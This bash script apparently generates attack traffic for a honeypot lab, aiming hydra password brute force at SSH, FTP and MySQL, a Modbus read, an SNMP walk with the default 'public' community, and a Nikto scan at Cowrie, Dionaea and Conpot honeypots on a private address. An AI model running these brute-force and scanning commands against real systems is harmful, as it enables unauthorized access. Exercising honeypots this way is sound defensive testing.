#!/bin/bash
TARGET_IP=${TARGET_IP:-"192.168.1.33"}

echo "Starting SSH brute force on Cowrie (port 32086)"
hydra -l root -P /attacks/passwords.txt ssh://$TARGET_IP -s 32086 -t 4 -vV

echo "Starting FTP brute force on Dionaea (port 21)"
hydra -l root -P /attacks/passwords.txt ftp://$TARGET_IP -s 21 -t 4 -vV

echo "Starting MySQL brute force on Dionaea (port 3306)"
hydra -l root -P /attacks/passwords.txt mysql://$TARGET_IP -s 3306 -t 4 -vV

echo "Modbus read on Conpot (port 502)"
mbpoll -m tcp -p 502 -r 1 -c 10 $TARGET_IP

echo "SNMP walk on Conpot (default community 'public')"
snmpwalk -v1 -c public $TARGET_IP

echo "Nikto HTTP scan on Dionaea and Conpot (port 80)"
nikto -host http://$TARGET_IP
